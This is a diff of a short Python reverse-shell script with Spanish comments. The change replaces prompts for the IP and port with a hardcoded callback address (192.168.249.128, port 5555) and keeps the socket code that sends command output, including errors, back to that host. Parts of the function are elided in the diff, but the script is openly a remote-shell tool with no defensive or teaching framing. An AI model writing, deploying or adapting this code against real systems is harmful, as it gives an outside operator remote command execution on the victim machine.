@@ -1,7 +1,11 @@
 import socket
 import subprocess
 
-def run(ip, port):
+def run():
+    # Configuración de la dirección IP y el puerto
+    ip = "192.168.249.128"  # Cambia esto por la IP deseada
+    port = 5555  # Cambia esto por el puerto deseado
+
     # Crear un socket TCP
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -28,12 +32,8 @@ def run(ip, port):
         s.sendall(err)
 
 def main():
-    # Solicitar la IP y el puerto
-    ip = input("Introduzca la IP: ")
-    port = int(input("Introduzca el puerto: "))  # Convertir a entero
-
     # Ejecutar la función de shell inverso
-    run(ip, port)
+    run()
 
 if __name__ == "__main__":
     main()
